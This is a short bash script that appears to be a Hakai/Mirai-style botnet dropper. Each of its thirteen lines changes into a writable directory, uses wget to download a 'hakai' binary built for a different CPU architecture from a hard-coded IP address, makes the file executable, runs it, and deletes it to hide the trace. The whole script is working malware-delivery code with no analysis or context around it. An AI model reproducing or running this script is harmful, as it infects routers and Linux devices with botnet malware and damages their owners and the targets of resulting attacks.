#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.mips; chmod +x hakai.mips; ./hakai.mips; rm -rf hakai.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.mpsl; chmod +x hakai.mpsl; ./hakai.mpsl; rm -rf hakai.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.sh4; chmod +x hakai.sh4; ./hakai.sh4; rm -rf hakai.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.x86; chmod +x hakai.x86; ./hakai.x86; rm -rf hakai.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.arm6; chmod +x hakai.arm6; ./hakai.arm6; rm -rf hakai.arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.x86_64; chmod +x hakai.x86_64; ./hakai.x86_64; rm -rf hakai.x86_64
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.ppc; chmod +x hakai.ppc; ./hakai.ppc; rm -rf hakai.ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.m68k; chmod +x hakai.m68k; ./hakai.m68k; rm -rf hakai.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.sparc; chmod +x hakai.sparc; ./hakai.sparc; rm -rf hakai.sparc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.arm4; chmod +x hakai.arm4; ./hakai.arm4; rm -rf hakai.arm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.arm5; chmod +x hakai.arm5; ./hakai.arm5; rm -rf hakai.arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.arm7; chmod +x hakai.arm7; ./hakai.arm7; rm -rf hakai.arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.125.188/hakai.dbg; chmod +x hakai.dbg; ./hakai.dbg; rm -rf hakai.dbg